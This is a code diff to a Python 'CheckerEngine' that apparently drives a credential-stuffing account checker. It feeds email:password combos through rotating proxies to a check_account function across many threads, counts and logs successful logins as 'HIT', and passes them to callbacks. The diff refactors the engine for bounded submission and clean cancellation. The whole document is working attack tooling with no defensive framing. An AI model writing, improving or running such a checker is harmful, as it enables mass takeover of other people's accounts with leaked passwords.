@@ -5,8 +5,8 @@ from __future__ import annotations
 import itertools
 import threading
 import time
-from collections.abc import Callable
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from collections.abc import Callable, Iterator
+from concurrent.futures import FIRST_COMPLETED, Future, ThreadPoolExecutor, wait
 from dataclasses import dataclass, field
 
 from .api import AccountResult, check_account
@@ -58,7 +58,7 @@ class CheckerEngine:
     def is_stopped(self) -> bool:
         return self._stop.is_set()
 
-    def _proxy_cycle(self):
+    def _proxy_cycle(self) -> Iterator[str | None]:
         if not self.proxies:
             return itertools.repeat(None)
         return itertools.cycle(self.proxies)
@@ -71,55 +71,100 @@ class CheckerEngine:
         if self.on_progress:
             self.on_progress(self.stats)
 
+    def _submit_next(
+        self,
+        pool: ThreadPoolExecutor,
+        combo_iter: Iterator[tuple[str, str]],
+        proxy_iter: Iterator[str | None],
+        futures: dict[Future[AccountResult], tuple[str, str]],
+    ) -> None:
+        while len(futures) < self.threads and not self.is_stopped():
+            try:
+                email, password = next(combo_iter)
+            except StopIteration:
+                return
+            proxy = next(proxy_iter)
+            fut = pool.submit(check_account, email, password, proxy)
+            futures[fut] = (email, password)
+
+    def _handle_result(
+        self,
+        fut: Future[AccountResult],
+        email: str,
+        password: str,
+        hits: list[AccountResult],
+    ) -> None:
+        try:
+            result = fut.result()
+        except Exception as exc:
+            result = AccountResult(
+                email=email,
+                password=password,
+                success=False,
+                message=str(exc),
+            )
+
+        with self._lock:
+            self.stats.checked += 1
+            if result.success:
+                self.stats.hits += 1
+                hits.append(result)
+            else:
+                self.stats.fails += 1
+
+        if result.success:
+            self._log(f"HIT  {result.summary_line()}")
+            if self.on_hit:
+                self.on_hit(result)
+        else:
+            short = result.message[:80] if result.message else "failed"
+            self._log(f"FAIL {email} | {short}")
+            if self.on_fail:
+                self.on_fail(result)
+
+        self._emit_progress()
+
+    def _shutdown_pool(self, pool: ThreadPoolExecutor, *, cancel_pending: bool) -> None:
+        try:
+            pool.shutdown(wait=not cancel_pending, cancel_futures=cancel_pending)
+        except TypeError:
+            pool.shutdown(wait=not cancel_pending)
+
     def run(self) -> list[AccountResult]:
         hits: list[AccountResult] = []
+        combo_iter = iter(self.combos)
         proxy_iter = self._proxy_cycle()
 
         self.stats.start_time = time.time()
         self._log(f"Starting {self.stats.total} combos with {self.threads} threads")
 
-        with ThreadPoolExecutor(max_workers=self.threads) as pool:
-            futures = {}
-            for email, password in self.combos:
+        pool = ThreadPoolExecutor(max_workers=self.threads)
+        futures: dict[Future[AccountResult], tuple[str, str]] = {}
+        stopped = False
+
+        try:
+            self._submit_next(pool, combo_iter, proxy_iter, futures)
+
+            while futures:
                 if self.is_stopped():
+                    stopped = True
+                    for pending in futures:
+                        pending.cancel()
                     break
-                proxy = next(proxy_iter)
-                fut = pool.submit(check_account, email, password, proxy)
-                futures[fut] = (email, password)
 
-            for fut in as_completed(futures):
-                if self.is_stopped():
-                    break
-                email, password = futures[fut]
-                try:
-                    result = fut.result()
-                except Exception as exc:
-                    result = AccountResult(
-                        email=email,
-                        password=password,
-                        success=False,
-                        message=str(exc),
-                    )
+                done, _ = wait(futures.keys(), return_when=FIRST_COMPLETED, timeout=0.5)
+                if not done:
+                    continue
 
-                with self._lock:
-                    self.stats.checked += 1
-                    if result.success:
-                        self.stats.hits += 1
-                        hits.append(result)
-                    else:
-                        self.stats.fails += 1
+                for fut in done:
+                    email, password = futures.pop(fut)
+                    if fut.cancelled():
+                        continue
+                    self._handle_result(fut, email, password, hits)
+                    if not self.is_stopped():
+                        self._submit_next(pool, combo_iter, proxy_iter, futures)
+        finally:
+            self._shutdown_pool(pool, cancel_pending=stopped)
 
-                if result.success:
-                    self._log(f"HIT  {result.summary_line()}")
-                    if self.on_hit:
-                        self.on_hit(result)
-                else:
-                    short = result.message[:80] if result.message else "failed"
-                    self._log(f"FAIL {email} | {short}")
-                    if self.on_fail:
-                        self.on_fail(result)
-
-                self._emit_progress()
-
-        self._log("Finished")
+        self._log("Stopped" if stopped else "Finished")
         return hits
